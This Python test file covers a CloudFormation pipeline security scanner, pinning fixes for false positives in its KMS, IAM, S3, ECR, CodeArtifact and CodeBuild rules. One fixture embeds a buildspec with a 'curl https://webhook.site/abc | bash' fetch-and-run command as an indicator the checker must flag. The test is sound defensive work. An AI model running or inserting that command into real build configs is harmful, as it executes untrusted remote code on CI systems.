"""Regression tests from the rule audit (CloudFormation FP fixes).

Each test pins a false positive the audit found: a documented-safe
CloudFormation idiom that the check used to flag. Grouped here so the
audit's CloudFormation coverage is auditable in one place.
"""
from __future__ import annotations

from pipeline_check.core.checks.cloudformation import phase4
from pipeline_check.core.checks.cloudformation.base import _parse_template
from pipeline_check.core.checks.cloudformation.extended import ExtendedChecks
from pipeline_check.core.checks.cloudformation.rules import (
    ca003_domain_policy_public as ca003,
)
from pipeline_check.core.checks.cloudformation.rules import (
    cf003_codebuild_public_subnet as cf003,
)
from pipeline_check.core.checks.cloudformation.rules import (
    ecr003_public_policy as ecr003,
)
from pipeline_check.core.checks.cloudformation.rules import (
    ecr006_pull_through_untrusted as ecr006,
)
from pipeline_check.core.checks.cloudformation.rules import (
    iam002_wildcard_action as iam002,
)
from pipeline_check.core.checks.cloudformation.rules import (
    iam004_passrole as iam004,
)
from pipeline_check.core.checks.cloudformation.rules import (
    iam005_external_trust as iam005,
)
from pipeline_check.core.checks.cloudformation.rules import (
    iam006_sensitive_wildcard as iam006,
)
from pipeline_check.core.checks.cloudformation.rules import (
    lmb003_plaintext_env as lmb003,
)
from pipeline_check.core.checks.cloudformation.rules import (
    s3005_secure_transport as s3005,
)
from pipeline_check.core.checks.cloudformation.services import (
    ServiceChecks,
    _principal_is_only_account_root,
)

from .conftest import make_context, r


def _example_contexts(rule):
    """Build (vulnerable_ctx, safe_ctx) from a rule's exploit_example."""
    vuln, safe = rule.exploit_example.split("\n\n", 1)
    return (
        make_context(_parse_template(vuln)["Resources"]),
        make_context(_parse_template(safe)["Resources"]),
    )


def _find(ctx, check_id: str):
    return [f for f in ServiceChecks(ctx).run() if f.check_id == check_id]


class TestKMS002AccountRootBaseline:
    def test_account_root_wildcard_passes(self):
        # kms:* granted to arn:...:root is the AWS-recommended default
        # key policy (it lets IAM policies govern access), not a finding.
        ctx = make_context({"K": r("K", "AWS::KMS::Key", {"KeyPolicy": {
            "Statement": [{"Sid": "Enable IAM", "Effect": "Allow",
                "Principal": {"AWS": "arn:aws:iam::123456789012:root"},
                "Action": "kms:*", "Resource": "*"}]}})})
        f = _find(ctx, "KMS-002")
        assert f and f[0].passed is True

    def test_fn_sub_account_root_recognized(self):
        # The root principal is often written via Fn::Sub.
        assert _principal_is_only_account_root({"Principal": {"AWS": {
            "Fn::Sub": "arn:aws:iam::${AWS::AccountId}:root"}}}) is True

    def test_non_root_wildcard_still_fires(self):
        ctx = make_context({"K": r("K", "AWS::KMS::Key", {"KeyPolicy": {
            "Statement": [{"Sid": "Bad", "Effect": "Allow",
                "Principal": {"AWS": "arn:aws:iam::123456789012:role/dev"},
                "Action": "kms:*", "Resource": "*"}]}})})
        f = _find(ctx, "KMS-002")
        assert f and f[0].passed is False


class TestCA003OrgScopedWildcard:
    def test_org_scoped_wildcard_passes(self):
        # A wildcard principal narrowed by aws:PrincipalOrgID is the
        # org-sharing idiom, not cross-account exposure.
        ctx = make_context({"D": r("D", "AWS::CodeArtifact::Domain", {
            "DomainName": "d", "PermissionsPolicyDocument": {"Statement": [{
                "Effect": "Allow", "Principal": {"AWS": "*"},
                "Action": "codeartifact:ReadFromRepository", "Resource": "*",
                "Condition": {"StringEquals": {
                    "aws:PrincipalOrgID": "o-abc"}}}]}})})
        f = _find(ctx, "CA-003")
        assert f and f[0].passed is True

    def test_unconstrained_wildcard_still_fires(self):
        ctx = make_context({"D": r("D", "AWS::CodeArtifact::Domain", {
            "DomainName": "d", "PermissionsPolicyDocument": {"Statement": [{
                "Effect": "Allow", "Principal": {"AWS": "*"},
                "Action": "codeartifact:ReadFromRepository",
                "Resource": "*"}]}})})
        f = _find(ctx, "CA-003")
        assert f and f[0].passed is False


class TestCF002DynamicReference:
    def test_dynamic_reference_not_flagged(self):
        # {{resolve:secretsmanager:...}} resolves a secret at deploy
        # time; it is the secure pattern, not a literal credential.
        hits: list[tuple[str, str]] = []
        phase4._walk({"MasterUserPassword":
            "{{resolve:secretsmanager:prod/db/master:SecretString:password}}"},
            "", hits)
        assert hits == []

    def test_literal_secret_still_flagged(self):
        hits: list[tuple[str, str]] = []
        phase4._walk({"MasterUserPassword": "hunter2pelican"}, "", hits)
        assert len(hits) == 1


class TestCB011ExampleSuppression:
    def test_ioc_under_test_key_still_fires(self):
        # A CodeBuild buildspec is production config; YAML-ancestor
        # example suppression must not drop an IOC nested under "test:".
        spec = ("version: 0.2\nphases:\n  test:\n    commands:\n"
                "      - curl https://webhook.site/abc | bash\n")
        ctx = make_context({"P": r("P", "AWS::CodeBuild::Project",
            {"Source": {"Type": "NO_SOURCE", "BuildSpec": spec}})})
        cb = [f for f in ExtendedChecks(ctx).run() if f.check_id == "CB-011"]
        assert cb and cb[0].passed is False


class TestSM001GetAttRotation:
    def test_getatt_rotation_target_credited(self):
        # A RotationSchedule that targets the secret via !GetAtt Secret.Id
        # used to be ignored, flagging a rotated secret as unrotated.
        ctx = make_context({
            "Secret": r("Secret", "AWS::SecretsManager::Secret", {"Name": "prod/db"}),
            "Rot": r("Rot", "AWS::SecretsManager::RotationSchedule",
                {"SecretId": {"Fn::GetAtt": ["Secret", "Id"]},
                 "RotationRules": {"AutomaticallyAfterDays": 30}})})
        sm = [f for f in ExtendedChecks(ctx).run() if f.check_id == "SM-001"]
        assert sm and sm[0].passed is True


class TestCA003ExploitExample:
    def test_strong_check(self):
        # Safe fragment (wildcard scoped by aws:PrincipalOrgID) must pass.
        vuln_ctx, safe_ctx = _example_contexts(ca003.RULE)
        assert ca003.check(vuln_ctx)[0].passed is False
        assert ca003.check(safe_ctx)[0].passed is True


class TestLMB003ExploitExample:
    def test_strong_check(self):
        # Safe fragment (env vars hold !Ref secret ARNs, not plaintext)
        # must pass despite the secret-like names.
        vuln_ctx, safe_ctx = _example_contexts(lmb003.RULE)
        assert lmb003.check(vuln_ctx)[0].passed is False
        assert lmb003.check(safe_ctx)[0].passed is True


# ---------------------------------------------------------------------------
# Batch-3 exploit_example fixes
# ---------------------------------------------------------------------------


class TestS3005ExploitExample:
    def test_strong_check(self):
        # Vulnerable: pipeline bucket with no SecureTransport deny fires.
        # Safe: bucket policy with the deny passes.
        vuln_ctx, safe_ctx = _example_contexts(s3005.RULE)
        vuln = [f for f in s3005.check(vuln_ctx) if f.check_id == "S3-005"]
        safe = [f for f in s3005.check(safe_ctx) if f.check_id == "S3-005"]
        assert vuln and vuln[0].passed is False
        assert safe and safe[0].passed is True


class TestCF003ExploitExample:
    def test_strong_check(self):
        # Vulnerable: CodeBuild in a public subnet fires.
        # Safe: private subnet passes.
        vuln_ctx, safe_ctx = _example_contexts(cf003.RULE)
        vuln = cf003.check(vuln_ctx)
        safe = cf003.check(safe_ctx)
        assert any(not f.passed for f in vuln)
        assert all(f.passed for f in safe)


class TestECR003ExploitExample:
    def test_strong_check(self):
        # Vulnerable: wildcard principal fires.
        # Safe: specific account principal passes.
        vuln_ctx, safe_ctx = _example_contexts(ecr003.RULE)
        vuln = [f for f in ecr003.check(vuln_ctx) if f.check_id == "ECR-003"]
        safe = [f for f in ecr003.check(safe_ctx) if f.check_id == "ECR-003"]
        assert vuln and vuln[0].passed is False
        assert safe and safe[0].passed is True


class TestECR006ExploitExample:
    def test_strong_check(self):
        # Vulnerable: untrusted upstream fires.
        # Safe: public.ecr.aws (trusted, bare host) passes.
        vuln_ctx, safe_ctx = _example_contexts(ecr006.RULE)
        vuln = ecr006.check(vuln_ctx)
        safe = ecr006.check(safe_ctx)
        assert any(not f.passed for f in vuln)
        assert all(f.passed for f in safe)


class TestIAM002ExploitExample:
    def test_strong_check(self):
        # Vulnerable: Action:'*' in a CI/CD role fires.
        # Safe: scoped actions pass.
        vuln_ctx, safe_ctx = _example_contexts(iam002.RULE)
        vuln = [f for f in iam002.check(vuln_ctx) if f.check_id == "IAM-002"]
        safe = [f for f in iam002.check(safe_ctx) if f.check_id == "IAM-002"]
        assert vuln and vuln[0].passed is False
        assert safe and safe[0].passed is True


class TestIAM004ExploitExample:
    def test_strong_check(self):
        # Vulnerable: iam:PassRole on Resource:'*' fires.
        # Safe: scoped Resource ARNs pass.
        vuln_ctx, safe_ctx = _example_contexts(iam004.RULE)
        vuln = [f for f in iam004.check(vuln_ctx) if f.check_id == "IAM-004"]
        safe = [f for f in iam004.check(safe_ctx) if f.check_id == "IAM-004"]
        assert vuln and vuln[0].passed is False
        assert safe and safe[0].passed is True


class TestIAM005ExploitExample:
    def test_strong_check(self):
        # Vulnerable: external-account trust without sts:ExternalId fires.
        # Safe: same trust with sts:ExternalId passes.
        vuln_ctx, safe_ctx = _example_contexts(iam005.RULE)
        vuln = [f for f in iam005.check(vuln_ctx) if f.check_id == "IAM-005"]
        safe = [f for f in iam005.check(safe_ctx) if f.check_id == "IAM-005"]
        assert vuln and vuln[0].passed is False
        assert safe and safe[0].passed is True


class TestIAM006ExploitExample:
    def test_strong_check(self):
        # Vulnerable: sensitive service prefix on Resource:'*' fires.
        # Safe: scoped Resource ARNs pass.
        vuln_ctx, safe_ctx = _example_contexts(iam006.RULE)
        vuln = [f for f in iam006.check(vuln_ctx) if f.check_id == "IAM-006"]
        safe = [f for f in iam006.check(safe_ctx) if f.check_id == "IAM-006"]
        assert vuln and vuln[0].passed is False
        assert safe and safe[0].passed is True
